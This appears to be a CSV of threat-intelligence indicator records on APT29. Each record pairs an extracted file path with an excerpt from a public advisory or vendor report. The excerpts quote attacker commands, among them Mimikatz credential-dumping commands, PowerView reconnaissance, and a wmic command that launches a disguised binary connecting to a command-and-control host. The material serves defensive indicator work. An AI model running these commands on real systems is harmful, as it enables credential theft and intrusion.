1.0.0,actor--apt29,artifact--sha256:b73c5e45b2cfc55c691e56aee56f8de14537514542fc84b0a513a3f18b7c7442,observation--sha256:8e6c0799bdb2fc9e44e4fdc66b2b66e3056f82dbe050d17147308a01f76a2b27,file-path,C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\,C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:71480a36ca36b90207e4a2dcfdba16a7ced2050f79d7af37053d464befba2a2d,observation--sha256:b6f81d782308383740aba6ae4e50c3ada0e8c0c79f7f2bb92f7d12b186f6393c,file-path,C:\Program Files (x86)\Common Files\microsoft shared\Phone,C:\Program Files (x86)\Common Files\microsoft shared\Phone,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:540f54b48344a866a7639c1976b154fc76b0a2226c404d3421cc51d1f11d753a,observation--sha256:b1bcd323197be8b353251d739dad5d3486f020bba69db38efa6e6183e55918fb,file-path,C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\,C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:d9e4fd2ff3a49987d191f2aa0d6896ac7fc69f8491203859e85b842706f15022,observation--sha256:be1132a7f7e4868133ee39c1bc850b7a7ff198557f26c6f3ff0da59d16dbbeef,file-path,C:\Program Files (x86)\Microsoft Visual,C:\Program Files (x86)\Microsoft Visual,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:764cda9940827eda856ec21a2dc1ed450bbbadea7b75c70edd4651de3fa0ca63,observation--sha256:63d66a38e94e84cefb600a19174d6e7009489b289f45cf8fe732c66ed44f6a7e,file-path,C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe,C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:bdc4925495276ec384db841836125b51032d0f42319f763eb14ead74050e9cef,observation--sha256:7e250fdc719f7c887248a200a83aff516120fd22ef8cae5ba2211b8fd77b0b54,file-path,C:\Program Files\Common Files\Logitech\WMDrivers\,C:\Program Files\Common Files\Logitech\WMDrivers\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:147c8a751a42dc250c9241bb5ef96f48f6754bf21f8c004eb9a98f0327951b73,observation--sha256:3303f4b1cfb8054d60bde76bb1f4a67f0a0b9afce31ac68af2efaab993008a63,file-path,C:\Program Files\Microsoft SQL,C:\Program Files\Microsoft SQL,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:29c7c0c8122ee5386a5ab5698cbb973ab3c4b232bf6c8adbbaa143b104fd1bbe,observation--sha256:d633cccc449a9c73ebe6b44795e6af1161292bc5fc78ac54a3df959cf36dd968,file-path,C:\Program Files\Windows,C:\Program Files\Windows,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 13 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Windows Management Instrumentation T1047 SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31"" Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and ",
1.0.0,actor--apt29,artifact--sha256:ce7c8ea44b3d2f7df6bcb130044ad0df2c09bd847c5d07fbffb5ce748519dd35,observation--sha256:435b5a42285a67665c665226bf38442d5f9a536d9ad0b2e6337000b39be43b2c,file-path,C:\Program Files\Windows Defender Advanced Threat,C:\Program Files\Windows Defender Advanced Threat,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:55c2760decb1b40c05589a059dba39cf7a1203c6f4abd6f4c819c432455fec49,observation--sha256:9992cef2a19260780e8c8cfd90f7a039a4422bafd6d2b4a6ce40e38347eb20a9,file-path,C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\,C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:2530c6867d0d81cb4a6cadb1698c693df6f09631bd4e42d4a5406366fc765d2b,observation--sha256:9a3aa6785ee04d9f7d166c1ee1997275732769d2c67b5f6cc21fe5d495faacef,file-path,C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557-,C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:5cab28516cb6391d6341bbddddce375a6a431e22455632833a3a71c753400264,observation--sha256:088058f6188a3d094d5cd67b7f79c612d5050389cec2f121603b2171e3e68721,file-path,C:\ProgramData\JetBrains\TeamCity\config\internal.properties by,C:\ProgramData\JetBrains\TeamCity\config\internal.properties by,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:a9939bf483006991d9099ca2d7de52dfbe7eaba079765b367a41fe760b669386,observation--sha256:c0303e40ef23ba67a85045a914b61f2408a5a66cd932103b6422840f6e21633d,file-path,C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified,C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:d4bf5990ed3011d41a65e7e970db7d5d949c3880ab538cad9c7cd771ea42ebbf,observation--sha256:fb786b0938fc045512f7a9258afe6e6429624164b7015de72aad7fa1c91f4d86,file-path,C:\TeamCity\logs\teamcity-server.log will contain a log,C:\TeamCity\logs\teamcity-server.log will contain a log,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:f13a2fa736c1c0389ba9dbb042ed2a84c747aa39a633e97c61c347a32a3f657b,observation--sha256:540bdefe24726116a66d17fc6dc9b975aa090f291a92493619fe3dae3b6a77f0,file-path,C:\WINDOWS\system32\config\systemprofile\AppData\Local\Goo-,C:\WINDOWS\system32\config\systemprofile\AppData\Local\Goo-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
1.0.0,actor--apt29,artifact--sha256:19f9b00f8840974977df9f3c92f5a7bf6b7441d158ebd964711f1d760eb4ce14,observation--sha256:8fa458000a768a27e348e40c100fa4524b4323004cd25057d07b1a2818a79c28,file-path,C:\Windows\System32,C:\Windows\System32,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:e4fc6e8beda394ef7436b75842eb7f19f1b1cf931133189a30b16d27d58fc8de,observation--sha256:91d97210a4733be9934c10263c226827a2eba0fae19692b0c1f0c3aa8e50f67a,file-path,C:\Windows\System32\ntoskrnl.exe,C:\Windows\System32\ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:467b0a04c999b5171c2564c0f90c573cf014537b58b44fc50cd27c61174d0840,observation--sha256:561fa5d9484bf641f4f3ec6c97121030d9e5c44782424f7b41efd8b6f3241ab8,file-path,C:\Windows\Temp\,C:\Windows\Temp\,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:771d7610b8d4d7039a721df9c424f3aa837e4497ebf225389b007b7bd9fc14d0,observation--sha256:2950e8e55fe68e73a98b9590952afaed2e081834390d36d7f3faad8bfd82e88f,file-path,C:\Windows\WinStore,C:\Windows\WinStore,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:cc42a08a4d950f0cf0b81606c7a82fab526d58f62da77461dd30042331d1de2e,observation--sha256:bc7b74f06912214f3f155418034a7512431e69202b8daddb0252ea8a6c375915,file-path,C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:2fd1fc8387812773bf9c7487eb3d053e8f521be385628768bd6df47d5e5b9d8e,observation--sha256:474ae29137cdae2095ace57a2b195a45cde82925e12d9845528e54856b7c9a58,file-path,C:\Windows\system32\ntoskrnl.exe,C:\Windows\system32\ntoskrnl.exe,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 10 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 4: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Persistence Technique Title ID Use Scheduled Task T1053.005 SVR cyber actors may abuse Windows Task Schedule to perform task scheduling for initial or recurring execution of malicious code. Server Software Component: SQL Stored Procedures T1505.001 SVR cyber actors abuse SQL server stored procedures to maintain persistence. Boot or Logon Autostart Execu,
1.0.0,actor--apt29,artifact--sha256:c326b24c684584d63468cd72818742a8ae2047f5f7fd26eab8e058e4d90d1fc3,observation--sha256:8839530e76739ea075379ca472ea147e359ba870952bc14703472f27a2435ee6,file-path,"C:\Windows\system32\ntoskrnl.exe [T1547] – to precisely identify system version, likely as a","C:\Windows\system32\ntoskrnl.exe [T1547] – to precisely identify system version, likely as a",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:74510caf4d6583de6adb25b163c184607b07d4756f0afa893605449b9f0b83b3,observation--sha256:d5639d13226e4cd84889023f1d1436ede85931333fbbf685fc33646a003ea360,file-path,C:\Windows\temp,C:\Windows\temp,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:75ae99deefecab93566cd5ad740ece760ae56a9728488ae612b32338eb667de3,observation--sha256:f0053678c237cfdfc694a7bdfd7aba399f3932d5f3878789684bc635441c045f,file-path,C:\Windows\temp\1\ -DestinationPath,C:\Windows\temp\1\ -DestinationPath,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:fb6ffc616dec21d4e4229b67d2b227f0676391d4b9005c7c1a4d5e80992dab3a,observation--sha256:448e01703ad078729548c3708a18abfb6799c0477b42f946558e226d05f187cd,file-path,C:\Windows\temp\1\sam.sa,C:\Windows\temp\1\sam.sa,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:a113156c47ab60e8e27d66d59332c11c6bc95139b32f5991ca59ef3e93f21a18,observation--sha256:29454077e4ab19846e0ee4544138933b37d558e14d438d2d62f529c8707fd793,file-path,C:\Windows\temp\1\se.sa,C:\Windows\temp\1\se.sa,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:b3d2c68fbc2bbdd929594d8d3d42419dc26349d791e0e3f4b6f197f02cc433b4,observation--sha256:1628699058e3df00fc2828fd45c0693f8e0ae0f29d1129e6ab150bce526b79c8,file-path,C:\Windows\temp\1\sql.zip,C:\Windows\temp\1\sql.zip,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:1f3dedde029fa2ed80b3a34dab5b0166193ff3977b9b9714827a7bafc75427d4,observation--sha256:032d2c79e0549099e372d0ebda0324d97f477bee5a9f3b6516745cd852eb49ff,file-path,C:\Windows\temp\1\sy.sa,C:\Windows\temp\1\sy.sa,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
